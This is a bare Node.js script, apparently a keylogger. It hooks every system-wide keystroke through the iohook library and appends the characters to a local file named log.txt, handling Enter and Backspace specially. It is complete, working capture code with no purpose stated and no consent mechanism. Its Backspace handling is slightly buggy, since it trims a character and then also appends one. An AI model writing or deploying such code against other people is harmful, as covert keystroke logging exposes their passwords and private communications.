const iohook = require("iohook");
const fs = require("fs");

var text = "";

iohook.on("keydown", event => {
  //console.log(event.rawcode);
  if (event.rawcode === 8) {
    fs.readFile("log.txt", (err, data) => {
      if (err) {
        console.log(err);
      } else {
        fs.writeFile("log.txt", data.slice(0, -1), err => {
          if (err) {
            console.log(err);
          }
        });
      }
    });
  }
  if (event.rawcode != 13) {
    if (event.rawcode === 190) text = ".";
    else if (event.rawcode === 188) text = ",";
    else if (event.rawcode === 186) text = ";";
    else text = String.fromCharCode(event.rawcode);
    fs.appendFile("log.txt", text, err => {
      if (err) {
        console.log(err);
      }
    });
  } else {
    text = "\n";
    fs.appendFile("log.txt", text, err => {
      if (err) {
        console.log(err);
      }
    });
  }
});

iohook.start();
